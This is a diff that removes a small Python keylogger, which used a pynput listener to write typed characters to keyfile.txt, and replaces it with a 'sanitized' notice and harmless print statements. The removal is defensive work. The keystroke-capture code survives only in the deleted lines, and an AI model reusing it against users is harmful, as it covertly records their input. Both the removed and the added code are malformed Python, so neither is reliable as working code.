@@ -1,16 +1,14 @@
-from pynput import keyboard
+# Safe keyboard demo
 
-def keypressed(key):
-    print(str(key))
-    with open("keyfile.txt",'a') as logkey:
-        try:
-            char = key.char
-            logkey.write(char)
-        except:
-            print("Error getting char")
+This file has been sanitized to remove any keystroke logging or user-input capture behavior.
 
+Purpose:
+- demonstrate a non-invasive keyboard event pattern in a safe way
+- avoid recording or transmitting personal or sensitive keystrokes
+- keep the project educational and non-malicious
 
-if__name__=="__main__":   # type: ignore
-listener = keyboard.Listener(on_press=keypressed)
-listener.start()
-input()
+This sample intentionally does not store, print, or exfiltrate user input.
+
+if __name__ == "__main__":
+    print("Keyboard monitoring is disabled in this sanitized sample.")
+    print("This project does not capture or log keystrokes.")
